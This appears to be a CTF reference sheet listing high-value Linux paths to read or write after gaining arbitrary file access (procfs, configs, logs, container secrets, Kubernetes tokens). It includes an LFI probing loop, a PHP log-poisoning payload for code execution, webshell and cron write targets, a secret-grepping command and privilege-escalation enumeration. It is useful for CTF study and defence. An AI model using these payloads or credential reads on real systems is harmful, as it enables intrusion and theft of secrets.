---
title: "Reference - High-Value Linux Paths for CTF File Read"
category: misc
subcategory: linux
type: reference
tags: [linux-useful-paths, lfi, file-read, proc, procfs, etc-passwd, logs, config, post-exploitation, arbitrary-read, arbitrary-write, docker, suid, privilege-escalation, where-is-the-flag]
summary: "The files worth reading when a CTF challenge gives you arbitrary file read, grouped by what each one proves or unlocks."
related: [attack-surface-by-primitive, web-triage, flag-formats, regex-recipes]
---

## How to use this

You have an LFI, a path traversal, an XXE, or a shell on a challenge container. This is the ordered list of what to read and why. Most CTF file-read challenges are solved by one of the first ten rows.

```sh
# through an LFI parameter, in a loop
for p in /flag /flag.txt /etc/passwd /proc/self/environ /proc/self/cmdline /proc/version; do
  echo "== $p"; curl -s "https://target/?file=$p" | head -20
done
```

---

## 1. The flag itself

| Path | Note |
|---|---|
| `/flag`, `/flag.txt`, `/flag/flag.txt` | the most common placements |
| `/root/flag.txt`, `/home/ctf/flag.txt` | needs the right user |
| `/var/www/flag.txt`, `./flag.txt` | relative to the app's cwd |
| `/proc/self/cwd/flag.txt` | reads it without knowing the absolute path |
| whatever the `Dockerfile` says | always read the handout's `Dockerfile` first (`COPY flag.txt ...`) |

If the `Dockerfile` has `ENV FLAG=...` instead of a file, the flag is in the environment -> row 2.1.

---

## 2. procfs - the highest-value directory in a CTF

| Path | What it gives you |
|---|---|
| `/proc/self/environ` | the environment of the process doing the read. Flags set as env vars live here. Null-separated |
| `/proc/self/cmdline` | the exact argv of the running app |
| `/proc/self/cwd/<name>` | resolves relative to the app's working directory |
| `/proc/self/root/<path>` | resolves relative to the process root (useful inside chroots) |
| `/proc/self/fd/0`, `/1`, `/2`, `/3`... | open descriptors: log files, sockets, and **uploaded temporary files** |
| `/proc/self/maps` | the memory map: libc base, PIE base, stack and heap ranges |
| `/proc/self/status` | uid/gid, `CapEff` (capabilities), `TracerPid` (anti-debug detection) |
| `/proc/self/mountinfo`, `/proc/mounts` | what is mounted; reveals overlayfs and bind mounts |
| `/proc/1/cgroup` | says whether you are in a container and which runtime |
| `/proc/version` | kernel version string |
| `/proc/cpuinfo`, `/proc/meminfo` | host sizing; occasionally a challenge hint |
| `/proc/net/tcp`, `/proc/net/tcp6` | listening/connected sockets in hex, when you have no shell |
| `/proc/net/arp` | neighbours, for pivoting |
| `/proc/net/fib_trie` | the local IP ranges |
| `/proc/sched_debug`, `/proc/*/comm` | a process list without `ps` |
| `/proc/sys/kernel/randomize_va_space` | is ASLR on |

Decoding `/proc/net/tcp`:
```python
#!/usr/bin/env python3
"""Decode /proc/net/tcp into readable host:port pairs."""
import socket
import struct
import sys

STATES = {"01": "ESTABLISHED", "0A": "LISTEN", "06": "TIME_WAIT", "08": "CLOSE_WAIT"}

def parse(path="/proc/net/tcp"):
    rows = []
    for line in open(path).read().splitlines()[1:]:
        f = line.split()
        if len(f) < 4:
            continue
        def addr(s):
            ip, port = s.split(":")
            return socket.inet_ntoa(struct.pack("<I", int(ip, 16))), int(port, 16)
        rows.append((addr(f[1]), addr(f[2]), STATES.get(f[3], f[3])))
    return rows

if __name__ == "__main__":
    for local, remote, state in parse(sys.argv[1] if len(sys.argv) > 1 else "/proc/net/tcp"):
        print(f"{local[0]}:{local[1]:<6} -> {remote[0]}:{remote[1]:<6} {state}")
```

---

## 3. System configuration

| Path | Tells you |
|---|---|
| `/etc/passwd` | that your read works at all; the user list, home directories, and shells |
| `/etc/group` | group membership; `docker`, `lxd`, `disk` and `sudo` are the interesting ones |
| `/etc/hostname`, `/etc/hosts` | internal service names - these are your SSRF targets |
| `/etc/os-release`, `/etc/issue` | distro and version, for picking an exploit |
| `/etc/sudoers`, `/etc/sudoers.d/` | what the current user may run as root |
| `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.*/` | scheduled jobs; a writable script here is the classic privesc |
| `/etc/ssh/sshd_config` | whether key auth or root login is allowed |
| `/etc/fstab` | mounted network shares |
| `/etc/environment` | system-wide environment variables |
| `/etc/resolv.conf` | the DNS server, which in a container names the orchestrator |
| `/etc/ld.so.conf`, `/etc/ld.so.preload` | library search order; `ld.so.preload` is a write-to-RCE target |
| `/etc/systemd/system/*.service` | what services exist and how they start |

---

## 4. Application configuration and source

| Path | Typical content |
|---|---|
| `/var/www/html/`, `/app/`, `/srv/`, `/usr/src/app/` | the application root in most challenge containers |
| `<app>/.env` | framework secrets (`APP_KEY`, `SECRET_KEY`, DB URLs) |
| `<app>/config.php`, `settings.py`, `config.json`, `application.properties`, `appsettings.json` | the same by framework |
| `<app>/.git/config`, `.git/HEAD`, `.git/logs/HEAD` | a git repo you can reconstruct - `ctfbrain search git-leak` |
| `<app>/docker-compose.yml`, `Dockerfile` | the flag's location and the internal service names |
| `<app>/requirements.txt`, `package.json`, `composer.json`, `go.mod` | dependency versions -> CVE lookup |
| `/etc/nginx/nginx.conf`, `/etc/nginx/sites-enabled/*` | routing, aliases (`alias` misconfig = traversal), upstreams |
| `/etc/apache2/sites-enabled/*`, `/etc/httpd/conf/httpd.conf` | same for Apache |
| `/etc/php/*/fpm/php.ini`, `php.ini` | `open_basedir`, `disable_functions`, `allow_url_include` |
| `/usr/local/tomcat/conf/tomcat-users.xml` | Tomcat manager access |
| `/opt/`, `/usr/local/bin/` | custom binaries the challenge author added (e.g. `readflag`) |

```sh
# once you have a shell, sweep the app tree for secrets in one pass
grep -rniE 'secret|password|api[_-]?key|token|BEGIN [A-Z ]*PRIVATE KEY' /app /var/www 2>/dev/null | head -40
```
`ctfbrain search regex-recipes`

---

## 5. Logs (read for information, or poison for RCE)

| Path | Use |
|---|---|
| `/var/log/nginx/access.log`, `error.log` | requests including your own `User-Agent` -> **log poisoning turns LFI into RCE** |
| `/var/log/apache2/access.log`, `error.log` | same |
| `/var/log/auth.log`, `/var/log/secure` | SSH attempts; the username field is attacker-controlled -> poisoning |
| `/var/log/syslog`, `/var/log/messages` | general |
| `/var/log/mail.log` | SMTP content |
| `/var/log/vsftpd.log` | FTP; uploaded filenames are attacker-controlled |
| `/var/log/wtmp`, `/var/log/btmp`, `/var/run/utmp` | login records (`utmpdump`) |
| `/var/log/audit/audit.log` | command execution records |
| `/var/log/`+`<app>` | the challenge app's own log, often the intended read |
| `~/.bash_history`, `~/.zsh_history` | the previous user's commands - frequently the entire solution |
| `~/.viminfo`, `~/.lesshst`, `~/.mysql_history`, `~/.psql_history` | files recently opened and queries run |

Log poisoning pattern (LFI -> RCE, PHP):
```sh
# 1. put PHP into a log the app will include
curl -s https://target/ -H 'User-Agent: <?php system($_GET["c"]); ?>'
# 2. include the log through the LFI
curl -s 'https://target/?file=/var/log/nginx/access.log&c=id'
```

---

## 6. Container and runtime tells

| Path | Meaning |
|---|---|
| `/.dockerenv` | you are in a Docker container |
| `/run/secrets/` | Docker/Swarm secrets are mounted here |
| `/var/run/docker.sock` | the Docker socket; access to it is equivalent to host root |
| `/proc/1/cgroup` | names the container runtime and id |
| `/run/.containerenv` | Podman |
| `/var/run/secrets/kubernetes.io/serviceaccount/token` | a Kubernetes service-account token |
| `/var/run/secrets/kubernetes.io/serviceaccount/namespace` | the namespace |
| `/sys/fs/cgroup/` | cgroup v1/v2 layout, `release_agent` escapes |
| `/dev/` (block devices visible) | a privileged container; the host disk may be mountable |

---

## 7. Write targets (when you have arbitrary file write)

| Path | Effect |
|---|---|
| `/var/www/html/shell.php` (or the app's static dir) | a webshell you can then request |
| `~/.ssh/authorized_keys` | append a public key -> SSH in |
| `/etc/cron.d/x` | a cron entry runs as root on the next minute |
| `/etc/ld.so.preload` + a `.so` you also wrote | code execution in every new process |
| An existing `.py` / `.php` / `.js` that the app imports | executed on the next request |
| A template file in the app's template directory | server-side template execution |
| `/proc/self/mem` (with seek) | patch the running process |
| The app's `.env` / config | change a secret to one you know, then forge a token |
| `/etc/passwd` (append a line) | only if it is writable, which it usually is not |

---

## 8. Enumeration commands once you have a shell

```sh
id; whoami; hostname; uname -a; cat /etc/os-release
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
find / -perm -2000 -type f 2>/dev/null          # SGID
getcap -r / 2>/dev/null                          # file capabilities
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev)' | head
ls -la /etc/cron* /var/spool/cron 2>/dev/null
ps auxww; ss -tulpn 2>/dev/null || netstat -tulpn
env; cat /proc/self/environ | tr '\0' '\n'
mount; df -h
```

Automated: `linpeas.sh`, `linenum.sh`, `pspy` (to watch for cron jobs without root). For "this SUID binary is in my `sudo -l`, now what", the reference is GTFOBins.

---

## 9. PHP wrapper paths (LFI-specific)

| Wrapper | Use |
|---|---|
| `php://filter/convert.base64-encode/resource=index.php` | read source without executing it |
| `php://filter/read=string.rot13/resource=x.php` | same, alternative encoding |
| `php://input` | POST body as the included file (needs `allow_url_include`) |
| `data://text/plain;base64,<b64>` | inline code (needs `allow_url_include`) |
| `expect://id` | direct command execution (needs the expect extension) |
| `zip://archive.zip%23file.php` | read inside an uploaded archive |
| `phar://archive.phar/file` | triggers deserialization of the phar metadata |
| `/proc/self/fd/<n>` | reach an uploaded temp file that PHP still holds open |

`ctfbrain search lfi`
